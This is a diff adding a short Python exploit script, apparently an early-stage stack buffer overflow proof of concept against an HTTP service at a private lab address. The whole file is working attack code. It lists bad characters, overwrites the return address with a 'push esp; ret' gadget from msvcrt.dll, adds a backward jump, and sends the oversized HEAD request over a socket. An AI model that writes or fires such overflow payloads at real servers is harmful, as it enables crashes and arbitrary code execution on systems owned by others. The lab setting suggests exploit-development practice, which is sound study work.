@@ -1,0 +1,27 @@
+#!/usr/bin/env python
+
+import socket
+import os
+import sys
+
+# ------------------------------------------------
+# badchars: \x00\x0d\x0a\x3d\x20\x3f
+# Stage1:
+# (1) EIP: 0x77C35459 push esp # ret | msvcrt.dll
+# (2) ESP: jump back 60 bytes in the buffer => \xEB\xC4
+# ------------------------------------------------
+
+eip = "\x59\x54\xc3\x77"
+Stage1 = "A"*515 + eip + "\xEB\xC4"
+
+buffer = (
+"HEAD /" + Stage1 + " HTTP/1.1\r\n"
+"Host: 192.168.88.131:8080\r\n"
+"User-Agent: custom\r\n"
+"Keep-Alive: 115\r\n"
+"Connection: keep-alive\r\n\r\n")
+
+expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+expl.connect(("192.168.88.131", 8080))
+expl.send(buffer)
+expl.close()
